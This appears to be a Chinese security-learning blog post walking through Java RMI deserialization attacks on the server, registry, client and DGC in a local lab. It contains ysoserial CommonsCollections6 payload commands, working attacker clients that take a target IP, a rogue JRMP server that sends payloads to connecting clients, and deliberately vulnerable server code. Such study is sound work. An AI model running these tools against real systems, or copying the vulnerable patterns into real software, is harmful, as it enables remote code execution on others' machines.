+++
title = "RMI攻击"
date = 2026-06-14T21:35:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 什么是RMI


rmi  是远程方法调用    

意思就是让本机的jvm  通过 rmi 调用另一台主机的jvm当中的方法


## RMI 三大核心角色

- RMI Registry（注册表/中间商）
    
        
    服务端会把自己的远程对象名字（如 `"Calculator"`）和具体的服务地址绑定到注册表上。客户端来找服务时，先去注册表问：“我要调 `"Calculator"`，它在哪？”，注册表就会把引用的地址发给客户端。默认监听端口为 **`1099`**。
        
  RMI Server（服务端/技术专家）
    
    真正拥有并执行具体方法的地方。它把方法绑定到注册表，等待别人请求。
        
- RMI Client（客户端/金主爸爸）
    
     发起调用的一方。它先去注册表查到服务，然后远程传递参数给服务端执行，最后拿到执行结果。


## 造成的危害


客户端攻击服务端    利用反序列化     或者服务端反向攻击客户端   jndi当中的rmi就是




## RMI-攻击Server端



 攻击原理

  攻击者客户端
      ↓
  构造恶意序列化对象（ysoserial）
      ↓
  调用 RMI 远程方法，传入恶意对象
      ↓
  RMI 服务端反序列化参数
      ↓
  触发 Commons Collections Gadget 链
      ↓
  执行恶意代码（RCE


### 生成恶意文件

这样运行就能够弹计算机了

java -jar ysoserial.jar CommonsCollections6 "calc" > payload.bin

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529111953730.png)


### 启动服务端

mvn compile exec:java '-Dexec.mainClass=com.rmi.server.RmiServer'

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529105647241.png)

服务器源码

```java
package com.rmi.server;

  

import java.rmi.RemoteException;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

import java.rmi.server.UnicastRemoteObject;

  

/**

 * RMI 服务端实现（受害者）

 *

 * 漏洞成因：

 * 1. 暴露了一个接收 Object 参数的远程方法

 * 2. 当客户端调用该方法时，服务端会反序列化参数

 * 3. 如果参数是恶意序列化对象，会触发 Gadget 链

 *

 * 攻击条件：

 * 1. 服务端 ClassPath 中存在可利用的 Gadget 链（如 Commons Collections）

 * 2. 服务端没有禁用反序列化或没有使用白名单

 */

public class RmiServer extends UnicastRemoteObject implements IRemoteService {

  

    protected RmiServer() throws RemoteException {

        super();

    }

  

    /**

     * 远程方法实现

     *

     * 当客户端调用此方法时，Java RMI 底层会：

     * 1. 接收网络传输的字节流

     * 2. 调用 ObjectInputStream.readObject() 反序列化参数

     * 3. 如果参数是恶意对象，触发 Gadget 链

     */

    @Override

    public void doSomething(Object obj) throws RemoteException {

        // 业务逻辑：当收到客户端传来的对象时，打印其类名

        System.out.println("[-] 收到客户端请求，对象类型为: " + obj.getClass().getName());

        System.out.println("[-] 对象内容: " + obj.toString());

    }

  

    /**

     * 启动 RMI 服务端

     */

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("RMI 服务端反序列化攻击演示");

        System.out.println("========================================");

        System.out.println();

  

        // 1. 创建 RMI 注册表，监听 1099 端口

        Registry registry = LocateRegistry.createRegistry(1099);

        System.out.println("[+] RMI 注册表已创建，监听端口: 1099");

  

        // 2. 实例化远程服务对象

        RmiServer server = new RmiServer();

        System.out.println("[+] 远程服务对象已创建");

  

        // 3. 将远程服务绑定到注册表

        registry.bind("RemoteService", server);

        System.out.println("[+] 远程服务已绑定，名称: RemoteService");

  

        System.out.println();

        System.out.println("[-] RMI 服务端已成功启动，正在监听 1099 端口...");

        System.out.println("[-] 等待客户端连接...");

        System.out.println();

        System.out.println("[!] 警告：此服务端存在反序列化漏洞！");

        System.out.println("[!] 原因：doSomething(Object obj) 方法接收任意对象参数");

        System.out.println("[!] 依赖：commons-collections 3.2.1 存在 Gadget 链");

        System.out.println();

  

        // 保持服务运行

        Thread.currentThread().join();

    }

}
```


```java
package com.rmi.server;

  

import java.rmi.Remote;

import java.rmi.RemoteException;

  

/**

 * RMI 远程服务接口

 *

 * 暴露了一个远程方法，接收一个通用的 Object 对象作为参数

 * 这是反序列化攻击的关键点：参数类型为 Object，可以传入任意对象

 */

public interface IRemoteService extends Remote {

  

    /**

     * 远程方法：接收一个 Object 对象

     *

     * 漏洞点：参数类型为 Object，攻击者可以传入恶意序列化对象

     * 当服务端反序列化这个对象时，会触发 Gadget 链

     *

     * @param obj 客户端传入的对象

     * @throws RemoteException RMI 异常

     */

    void doSomething(Object obj) throws RemoteException;

}
```



### 运行攻击服务端

mvn exec:java "-Dexec.mainClass=com.rmi.attack.MaliciousClient" "-Dexec.args=127.0.0.1 payload.bin"


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529112107729.png)


可以发现已经运行成功了  此时读取成功

```c
PS Z:\Desktop\日常学习\Java_security\Rmi_attack_server> mvn exec:java "-Dexec.mainClass=com.rmi.attack.MaliciousClient" "-Dexec.args=127.0.0.1 payload.bin"
[INFO] Scanning for projects...
[INFO]
[INFO] ---------------------< com.rmi:rmi-attack-server >----------------------
[INFO] Building RMI Server Deserialization Attack Demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]
[INFO] --- exec:3.1.0:java (default-cli) @ rmi-attack-server ---
========================================
RMI 服务端反序列化攻击 - 客户端
========================================

[*] 目标地址: 127.0.0.1:1099
[*] Payload 文件: payload.bin

[+] 正在连接 RMI 注册表...
[+] RMI 注册表连接成功
[+] 正在查找远程服务: RemoteService
[+] 远程服务查找成功
[+] 正在读取 Payload 文件: payload.bin
[+] Payload 读取成功，对象类型: java.util.HashSet

[!] 正在向服务端发送恶意反序列化 Payload 对象...

[+] Payload 发送成功！
[+] 如果服务端存在漏洞，应该已经触发了命令执行
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.466 s
[INFO] Finished at: 2026-05-29T11:20:58+08:00
[INFO] ------------------------------------------------------------------------
```

源码

```java
package com.rmi.attack;

  

import com.rmi.server.IRemoteService;

import java.io.FileInputStream;

import java.io.ObjectInputStream;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

  

/**

 * RMI 攻击者客户端

 *

 * 攻击流程：

 * 1. 连接目标 RMI 注册表

 * 2. 获取远程服务的引用 Stub

 * 3. 读取 ysoserial 生成的恶意序列化对象

 * 4. 调用远程方法，将恶意对象作为参数传入

 * 5. 服务端反序列化参数时触发 Gadget 链

 *

 * 前提条件：

 * 1. 服务端存在接收 Object 参数的远程方法

 * 2. 服务端 ClassPath 中存在可利用的 Gadget 链

 * 3. 攻击者能够访问 RMI 注册表

 */

public class MaliciousClient {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("RMI 服务端反序列化攻击 - 客户端");

        System.out.println("========================================");

        System.out.println();

  

        // 检查参数

        if (args.length < 2) {

            System.out.println("用法: java -jar client.jar <目标IP> <payload文件> [端口]");

            System.out.println();

            System.out.println("示例:");

            System.out.println("  java -jar client.jar 127.0.0.1 payload.bin");

            System.out.println("  java -jar client.jar 192.168.1.100 payload.bin 1099");

            System.out.println();

            System.out.println("生成 Payload:");

            System.out.println("  java -jar ysoserial.jar CommonsCollections6 \"calc\" > payload.bin");

            return;

        }

  

        String targetHost = args[0];

        String payloadFile = args[1];

        int targetPort = args.length > 2 ? Integer.parseInt(args[2]) : 1099;

  

        System.out.println("[*] 目标地址: " + targetHost + ":" + targetPort);

        System.out.println("[*] Payload 文件: " + payloadFile);

        System.out.println();

  

        try {

            // 1. 连接目标 RMI 注册表

            System.out.println("[+] 正在连接 RMI 注册表...");

            Registry registry = LocateRegistry.getRegistry(targetHost, targetPort);

            System.out.println("[+] RMI 注册表连接成功");

  

            // 2. 获取远程服务的引用 Stub

            System.out.println("[+] 正在查找远程服务: RemoteService");

            IRemoteService service = (IRemoteService) registry.lookup("RemoteService");

            System.out.println("[+] 远程服务查找成功");

  

            // 3. 从本地读取 ysoserial 生成的恶意序列化对象

            System.out.println("[+] 正在读取 Payload 文件: " + payloadFile);

            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(payloadFile));

            Object maliciousObj = ois.readObject();

            ois.close();

            System.out.println("[+] Payload 读取成功，对象类型: " + maliciousObj.getClass().getName());

  

            // 4. 调用远程方法，将恶意对象作为参数传入

            System.out.println();

            System.out.println("[!] 正在向服务端发送恶意反序列化 Payload 对象...");

            service.doSomething(maliciousObj);

  

            System.out.println();

            System.out.println("[+] Payload 发送成功！");

            System.out.println("[+] 如果服务端存在漏洞，应该已经触发了命令执行");

  

        } catch (Exception e) {

            System.out.println();

            System.out.println("[-] 攻击失败: " + e.getMessage());

            e.printStackTrace();

        }

    }

}
```



## RMI-攻击Registry端


攻击方式 1   利用  bind/rebind()方法注入恶意对象（因为rmi registry 提供了java.rmi.registry.Registry接口）里面包含了bind  和rebind 方法


攻击方式 2 利用 lookup() 方法 反序列化远程过客 （绕过本地限制）


攻击方式3 针对高版本JDK 的 JRMP监听反打 （JRMPListener）


下面我们用 第一种方式


### 生成恶意文件

```c
# 1. 临时切到 cmd
cmd

# 2. 在 CMD 里使用传统的 > 重定向生成文件（把 ysoserial.jar 的路径写对）
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED -jar ysoserial.jar CommonsCollections6 "calc" > payload.bin

# 3. 退出 CMD 回到 PowerShell
exit
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529161354284.png)



### 启动registry服务端

mvn compile exec:java '-Dexec.mainClass=com.rmi.registry.RegistryServer'

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529164446496.png)

源码

```java
package com.rmi.registry;

  

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

  

/**

 * RMI Registry 服务端（受害者）

 *

 * 漏洞成因：

 * 1. RMI Registry 默认监听 1099 端口

 * 2. 允许客户端调用 bind() / rebind() 方法绑定远程对象

 * 3. 绑定的对象名称和对象本身都会被序列化传输

 * 4. 如果传入恶意序列化对象，Registry 会反序列化并触发 Gadget 链

 *

 * 攻击条件：

 * 1. Registry 服务端 ClassPath 中存在可利用的 Gadget 链

 * 2. 攻击者能够访问 Registry（网络可达）

 * 3. Registry 没有禁用 bind() / rebind() 操作

 */

public class RegistryServer {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("RMI Registry 服务端（受害者）");

        System.out.println("========================================");

        System.out.println();

  

        // 1. 创建 RMI Registry，监听 1099 端口

        Registry registry = LocateRegistry.createRegistry(1099);

        System.out.println("[+] RMI Registry 已创建，监听端口: 1099");

  

        System.out.println();

        System.out.println("[-] Registry 服务端已成功启动，正在监听 1099 端口...");

        System.out.println("[-] 等待客户端连接...");

        System.out.println();

        System.out.println("[!] 警告：此 Registry 存在反序列化漏洞！");

        System.out.println("[!] 原因：允许客户端调用 bind() / rebind() 方法");

        System.out.println("[!] 依赖：commons-collections 3.2.1 存在 Gadget 链");

        System.out.println();

        System.out.println("[!] 攻击者可以通过以下方式利用：");

        System.out.println("    1. 调用 registry.bind(name, object)");

        System.out.println("    2. 调用 registry.rebind(name, object)");

        System.out.println("    3. 传入恶意序列化对象作为参数");

        System.out.println();

  

        // 保持服务运行

        Thread.currentThread().join();

    }

}
```


### 运行攻击registry服务端

mvn exec:java -Dexec.mainClass="com.rmi.attack.RegistryAttackClient" -Dexec.args="127.0.0.1 payload.bin 1099 rebind"



![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529165518982.png)


源码

```java
package com.rmi.attack;

  

import java.io.FileInputStream;

import java.io.ObjectInputStream;

import java.rmi.Remote;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

  

/**

 * RMI Registry 攻击客户端

 *

 * 攻击方式：利用 bind() / rebind() 方法注入恶意对象

 *

 * 攻击流程：

 * 1. 连接目标 RMI Registry

 * 2. 读取 ysoserial 生成的恶意序列化对象

 * 3. 调用 registry.bind() 或 registry.rebind() 方法

 * 4. 将恶意对象作为参数传入

 * 5. Registry 反序列化参数时触发 Gadget 链

 *

 * 前提条件：

 * 1. Registry 服务端 ClassPath 中存在可利用的 Gadget 链

 * 2. 攻击者能够访问 Registry（网络可达）

 * 3. Registry 没有禁用 bind() / rebind() 操作

 */

public class RegistryAttackClient {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("RMI Registry 攻击客户端");

        System.out.println("========================================");

        System.out.println();

  

        // 检查参数

        if (args.length < 2) {

            System.out.println("用法: java -jar client.jar <目标IP> <payload文件> [端口] [攻击方式]");

            System.out.println();

            System.out.println("示例:");

            System.out.println("  java -jar client.jar 127.0.0.1 payload.bin");

            System.out.println("  java -jar client.jar 192.168.1.100 payload.bin 1099");

            System.out.println("  java -jar client.jar 192.168.1.100 payload.bin 1099 bind");

            System.out.println("  java -jar client.jar 192.168.1.100 payload.bin 1099 rebind");

            System.out.println();

            System.out.println("攻击方式:");

            System.out.println("  bind   - 使用 bind() 方法注入（默认）");

            System.out.println("  rebind - 使用 rebind() 方法注入");

            System.out.println();

            System.out.println("生成 Payload:");

            System.out.println("  java -jar ysoserial.jar CommonsCollections6 \"calc\" > payload.bin");

            return;

        }

  

        String targetHost = args[0];

        String payloadFile = args[1];

        int targetPort = args.length > 2 ? Integer.parseInt(args[2]) : 1099;

        String attackMethod = args.length > 3 ? args[3] : "bind";

  

        System.out.println("[*] 目标地址: " + targetHost + ":" + targetPort);

        System.out.println("[*] Payload 文件: " + payloadFile);

        System.out.println("[*] 攻击方式: " + attackMethod);

        System.out.println();

  

        try {

            // 1. 连接目标 RMI Registry

            System.out.println("[+] 正在连接 RMI Registry...");

            Registry registry = LocateRegistry.getRegistry(targetHost, targetPort);

            System.out.println("[+] RMI Registry 连接成功");

  

            // 2. 从本地读取 ysoserial 生成的恶意序列化对象

            System.out.println("[+] 正在读取 Payload 文件: " + payloadFile);

            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(payloadFile));

            Object maliciousObj = ois.readObject();

            ois.close();

            System.out.println("[+] Payload 读取成功，对象类型: " + maliciousObj.getClass().getName());

  

            // 3. 调用 bind() 或 rebind() 方法，将恶意对象作为参数传入

            System.out.println();

            System.out.println("[!] 正在向 Registry 发送恶意反序列化 Payload 对象...");

  

            if ("rebind".equalsIgnoreCase(attackMethod)) {

                // 使用 rebind() 方法注入

                System.out.println("[*] 使用 rebind() 方法注入恶意对象");

                // 强制转换为 Remote 类型（RMI 协议要求）

                registry.rebind("MaliciousService", (Remote) maliciousObj);

            } else {

                // 使用 bind() 方法注入（默认）

                System.out.println("[*] 使用 bind() 方法注入恶意对象");

                // 强制转换为 Remote 类型（RMI 协议要求）

                registry.bind("MaliciousService", (Remote) maliciousObj);

            }

  

            System.out.println();

            System.out.println("[+] Payload 发送成功！");

            System.out.println("[+] 如果 Registry 存在漏洞，应该已经触发了命令执行");

  

        } catch (Exception e) {

            System.out.println();

            System.out.println("[-] 攻击失败: " + e.getMessage());

            e.printStackTrace();

        }

    }

}
```



## RMI-攻击Client端


一般stub 反序列化 

当rmi客户端通过  Naming.lookup("rmi://target:1099/service")查找远程对象时，服务端会返回那个Stub（存根) 对象

 攻击原理

  攻击者搭建恶意 Registry
      ↓
  等待受害者客户端连接
      ↓
  受害者调用 lookup() 方法
      ↓
  Registry 返回恶意序列化对象
      ↓
  客户端反序列化 Stub
      ↓
  触发 Commons Collections Gadget 链
      ↓
  在客户端执行恶意代码（RCE）

  关键点

  1. 漏洞点: 客户端 lookup() 方法会反序列化返回的对象
  2. 利用条件: 客户端有 Commons Collections 3.2.1 依赖
  3. Gadget 链: CommonsCollections6（最稳定）
  4. JDK 要求: JDK 8u121 之前版本


### 生成恶意文件


java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED -jar ysoserial.jar CommonsCollections6 "calc" > payload.bin


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529173540958.png)


### 启动恶意 RMI 服务端（攻击者）


java -cp "target/classes;%USERPROFILE%\.m2\repository\commons-collections\commons-collections\3.2.1\commons-collections-3.2.1.jar" com.rmi.attacker.MaliciousRmiServer payload.bin 1099




![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529190326999.png)


源码

```java
package com.rmi.attacker;

  

import java.io.*;

import java.net.ServerSocket;

import java.net.Socket;

  

/**

 * 恶意 RMI 服务端（攻击者）- JRMP 方式

 *

 * 攻击原理：

 * 1. 攻击者搭建一个恶意的 JRMP 服务端

 * 2. 当受害者客户端调用 lookup() 方法时

 * 3. 服务端返回恶意的序列化对象

 * 4. 客户端反序列化时触发 Gadget 链

 * 5. 在客户端执行恶意代码（RCE）

 *

 * 注意：这个实现使用原始 Socket 模拟 JRMP 协议

 */

public class MaliciousRmiServer {

  

    private static final int JRMP_PORT = 1099;

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("恶意 RMI 服务端（攻击者）- JRMP 方式");

        System.out.println("========================================");

        System.out.println();

  

        // 检查参数

        if (args.length < 1) {

            System.out.println("用法: java -jar server.jar <payload文件> [端口]");

            System.out.println();

            System.out.println("示例:");

            System.out.println("  java -jar server.jar payload.bin");

            System.out.println("  java -jar server.jar payload.bin 1099");

            System.out.println();

            System.out.println("生成 Payload:");

            System.out.println("  java -jar ysoserial.jar CommonsCollections6 \"calc\" > payload.bin");

            System.out.println();

            System.out.println("注意：");

            System.out.println("  此服务端会监听 JRMP 端口，等待客户端连接");

            System.out.println("  当客户端调用 lookup() 时，会返回恶意对象");

            return;

        }

  

        String payloadFile = args[0];

        int listenPort = args.length > 1 ? Integer.parseInt(args[1]) : JRMP_PORT;

  

        System.out.println("[*] Payload 文件: " + payloadFile);

        System.out.println("[*] 监听端口: " + listenPort);

        System.out.println();

  

        try {

            // 读取 Payload

            System.out.println("[+] 正在读取 Payload 文件: " + payloadFile);

            FileInputStream fis = new FileInputStream(payloadFile);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            byte[] buffer = new byte[1024];

            int len;

            while ((len = fis.read(buffer)) != -1) {

                baos.write(buffer, 0, len);

            }

            fis.close();

            byte[] payloadBytes = baos.toByteArray();

            System.out.println("[+] Payload 读取成功，大小: " + payloadBytes.length + " 字节");

  

            // 启动 JRMP 服务端

            System.out.println("[+] 正在启动 JRMP 服务端...");

            ServerSocket serverSocket = new ServerSocket(listenPort);

            System.out.println("[+] JRMP 服务端已启动，监听端口: " + listenPort);

  

            System.out.println();

            System.out.println("[-] 等待受害者客户端连接...");

            System.out.println("[-] 当受害者执行 lookup() 时，会触发反序列化攻击");

            System.out.println();

            System.out.println("[!] 攻击触发条件：");

            System.out.println("    1. 受害者客户端连接到此服务端");

            System.out.println("    2. 受害者 ClassPath 中存在 Commons Collections 3.2.1");

            System.out.println();

  

            // 保持服务运行，处理多个连接

            while (true) {

                try {

                    Socket clientSocket = serverSocket.accept();

                    System.out.println("[+] 收到客户端连接: " + clientSocket.getInetAddress());

  

                    // 处理客户端连接

                    handleClient(clientSocket, payloadBytes);

  

                } catch (Exception e) {

                    System.out.println("[-] 处理客户端连接失败: " + e.getMessage());

                }

            }

  

        } catch (Exception e) {

            System.out.println();

            System.out.println("[-] 启动失败: " + e.getMessage());

            e.printStackTrace();

        }

    }

  

    /**

     * 处理客户端连接

     */

    private static void handleClient(Socket clientSocket, byte[] payloadBytes) {

        try {

            InputStream in = clientSocket.getInputStream();

            OutputStream out = clientSocket.getOutputStream();

  

            // 读取客户端请求

            byte[] request = new byte[1024];

            int len = in.read(request);

  

            if (len > 0) {

                System.out.println("[+] 收到客户端请求，长度: " + len + " 字节");

  

                // 发送恶意 Payload

                System.out.println("[+] 正在发送恶意 Payload...");

                out.write(payloadBytes);

                out.flush();

  

                System.out.println("[+] Payload 发送成功！");

                System.out.println("[+] 如果客户端存在漏洞，应该已经触发了命令执行");

            }

  

            clientSocket.close();

  

        } catch (Exception e) {

            System.out.println("[-] 处理客户端失败: " + e.getMessage());

        }

    }

}
```


### 运行受害者客户端


新的思路



java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc"

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529211645074.png)

然后这个  jrmp 端口正在监听


然后另一个进行开启

java -Djava.rmi.server.useCodebaseOnly=false -cp "target/classes;commons-collections-3.2.1.jar" com.rmi.client.VictimClient 127.0.0.1 1099 pwn

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529211822526.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260529211843552.png)


此时就能弹计算机 

原理

  攻击者搭建恶意 JRMP 服务端
      ↓
  监听 JRMP 端口（默认 1099）
      ↓
  诱导受害者客户端连接
      ↓
  客户端发送 JRMP 请求
      ↓
  服务端返回恶意序列化对象
      ↓
  客户端反序列化响应
      ↓
  触发 Gadget 链
      ↓
  在客户端执行恶意代码（RCE）

源码

```java
package com.rmi.client;

  

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

  

/**

 * RMI 客户端（受害者）

 *

 * 漏洞成因：

 * 1. 客户端调用 lookup() 方法查找远程对象

 * 2. RMI 底层会反序列化从服务端返回的 Stub 对象

 * 3. 如果服务端返回恶意序列化对象，客户端会触发 Gadget 链

 *

 * 攻击条件：

 * 1. 客户端连接到攻击者控制的恶意 Registry

 * 2. 客户端 ClassPath 中存在可利用的 Gadget 链

 * 3. 客户端没有禁用反序列化或使用白名单

 */

public class VictimClient {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("RMI 客户端（受害者）");

        System.out.println("========================================");

        System.out.println();

  

        // 检查参数

        if (args.length < 1) {

            System.out.println("用法: java -jar client.jar <Registry地址> [端口] [服务名]");

            System.out.println();

            System.out.println("示例:");

            System.out.println("  java -jar client.jar 127.0.0.1");

            System.out.println("  java -jar client.jar 192.168.1.100 1099");

            System.out.println("  java -jar client.jar 192.168.1.100 1099 pwn");

            System.out.println();

            System.out.println("注意：");

            System.out.println("  - Registry 地址应该是攻击者的恶意服务端");

            System.out.println("  - 服务名默认为 'pwn'（攻击者绑定的恶意对象）");

            return;

        }

  

        String registryHost = args[0];

        int registryPort = args.length > 1 ? Integer.parseInt(args[1]) : 1099;

        String serviceName = args.length > 2 ? args[2] : "pwn";

  

        System.out.println("[*] Registry 地址: " + registryHost + ":" + registryPort);

        System.out.println("[*] 服务名: " + serviceName);

        System.out.println();

  

        try {

            // 1. 连接到 RMI Registry

            System.out.println("[+] 正在连接 RMI Registry...");

            Registry registry = LocateRegistry.getRegistry(registryHost, registryPort);

            System.out.println("[+] RMI Registry 连接成功");

  

            // 2. 查找远程对象（触发反序列化攻击）

            System.out.println("[+] 正在查找远程服务: " + serviceName);

            System.out.println("[!] 警告：即将触发反序列化操作！");

            System.out.println("[!] 如果 Registry 是恶意的，客户端将被攻击");

            System.out.println();

  

            // 关键点：lookup() 方法会反序列化从服务端返回的对象

            // 如果服务端返回恶意对象，这里会触发 Gadget 链

            Object remoteObject = registry.lookup(serviceName);

  

            System.out.println("[+] lookup() 返回成功");

            System.out.println("[+] 返回对象类型: " + remoteObject.getClass().getName());

  

        } catch (Exception e) {

            System.out.println();

            System.out.println("[-] 操作失败: " + e.getMessage());

            e.printStackTrace();

        }

    }

}
```


## RMI-攻击DGC

DGC(分布式垃圾回收) 




RMI 的 DGC 接口（`sun.rmi.transport.DGC`）在处理请求时，同样会执行 **反序列化（Deserialization）** 操作。如果服务端没有配置适当的序列化过滤器（Serial Filter），攻击者可以通过构造恶意的 `dirty` 请求，向服务端的 `DGC` 接口发送精心伪造的序列化对象。


DGC 攻击原理

  攻击者搭建恶意 DGC 服务端
      ↓
  监听 DGC 端口（1099）
      ↓
  受害者客户端连接到 RMI 服务
      ↓
  自动触发 DGC.dirty() 调用
      ↓
  服务端返回恶意序列化对象
      ↓
  客户端反序列化响应
      ↓
  触发 Commons Collections Gadget 链
      ↓
  在客户端执行恶意代码（RCE）


### 生成恶意文件


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260603230650494.png)


### 启动恶意 DGC 服务端（攻击者）


```c
mvn exec:java -Dexec.mainClass=com.rmi.attacker.MaliciousDGCServer -Dexec.args="payload.bin 1099"
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260603230918396.png)



### 运行受害者客户端

尝试运行

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260603231319907.png)

发现已经成功了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260603231300676.png)
